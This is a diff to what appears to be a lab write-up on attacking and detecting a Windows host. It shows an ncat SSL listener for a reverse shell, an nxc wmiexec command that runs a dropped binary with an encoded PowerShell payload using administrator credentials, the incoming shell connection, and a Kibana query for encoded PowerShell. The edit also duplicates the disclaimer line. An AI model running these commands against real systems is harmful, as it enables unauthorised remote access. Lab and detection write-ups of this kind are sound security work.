@@ -108,13 +108,13 @@ A custom C# binary (`getit1.exe`) and encoded PowerShell payload (`ld.ps1`) are 
 [Kali] sudo ncat --ssl --ssl-key key.pem --ssl-cert cert.pem -lvnp 8443
 ```
 
-### 4. Execute via nxc wmiexec
+### 4. Remote Execution via nxc wmiexec
 
 ```bash
 [Kali] nxc smb 192.168.1.83 -u administrator -p '<PASSWORD>' --no-output -x "C:\\Windows\\Tasks\\getit1.exe $ENCODED"
 ```
 
-### 5. Shell Received
+### 5. Initial Access Confirmed
 
 ```
 Ncat: Connection from 192.168.1.83
@@ -266,7 +266,7 @@ winlog.event_data.CommandLine: *JAB*
 
 ---
 
-*Lab environment. All credentials redacted. Do not use against systems you do not own or have explicit written permission to test.*
+*Lab environment. All credentials redacted. Do not use against systems you do not own or have explicit written permission to test.*Lab environment. All credentials redacted. Do not use against systems you do not own or have explicit written permission to test.*
 ---
 <img width="1715" height="917" alt="kibanarules" src="https://github.com/user-attachments/assets/90db4b52-5adb-4bc2-bec3-672cf0ba6397" />
 
